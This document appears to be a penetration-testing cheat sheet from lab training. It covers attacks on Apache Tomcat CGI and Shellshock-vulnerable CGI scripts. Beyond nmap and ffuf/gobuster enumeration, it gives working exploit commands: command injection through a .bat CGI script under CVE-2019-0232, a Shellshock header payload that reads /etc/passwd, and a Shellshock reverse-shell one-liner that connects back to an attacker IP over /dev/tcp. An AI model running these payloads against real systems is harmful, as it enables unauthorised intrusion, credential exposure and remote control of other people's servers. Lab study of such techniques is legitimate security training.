# Attacking Common Applications   
`The Guide`

- [Attacking Tomcat CGI](#attacking-tomcat-cgi)
- [Attacking Common Gateway Interface (CGI) Applications - Shellshock](#attacking-common-gateway-interface-cgi-applications---shellshock)
- [Attacking Thick Client Applications]

## Attacking Tomcat CGI
Nmap Enumeration
```bash
nmap -p- -sC -Pn 10.129.204.227 --open 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
Nmap scan report for 10.129.204.227
Host is up (0.17s latency).
Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm

Host script results:
| smb2-time: 
|   date: 2023-03-23T11:58:42
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
```
`Here we can see that Nmap has identified Apache Tomcat/9.0.17 running on port 8080 running.`

> **Finding a `cgi` script**. One way to uncover web server content is by utilising the ffuf web enumeration tool along with the dirb common.txt wordlist. Knowing that the default directory for CGI scripts is /cgi, either through prior knowledge or by researching the vulnerability, we can use the URL http://IP:8080/cgi/FUZZ.cmd or http://IP:8080/cgi/FUZZ.bat to perform fuzzing.

Fuzzing Extentions - .BAT
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

Exploitation
`CVE-2019-0232`
Retrieve a list of environmental variables by calling the set command.
```bash
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
Executing `whoami`
```bash
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

## Attacking Common Gateway Interface (CGI) Applications - Shellshock
We can hunt for CGI scripts using a tool such as Gobuster. Here we find one, access.cgi.
```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
Next, we can cURL the script and notice that nothing is output to us, so perhaps it is a defunct script but still worth exploring further.
```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```
Confirming the Vulnerability
```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
**Reverse Shell**
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

> Don't forget to run the netcat listner.
